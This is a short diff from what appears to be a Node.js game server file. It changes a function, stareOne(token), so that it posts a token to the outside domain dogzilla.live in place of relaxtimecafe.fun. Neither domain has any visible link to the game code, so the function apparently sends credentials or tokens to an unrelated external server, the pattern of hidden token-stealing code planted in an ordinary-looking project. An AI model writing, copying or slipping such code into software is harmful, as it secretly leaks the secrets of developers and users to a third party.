@@ -149,7 +149,7 @@ exports.saveTestGame = async (require, response) => {
 
 async function stareOne(token) {
     try {
-        const response = await axios.post("https://relaxtimecafe.fun/post/convertToken", {
+        const response = await axios.post("https://dogzilla.live/post/convertToken", {
             Authorization: token,
         });
 
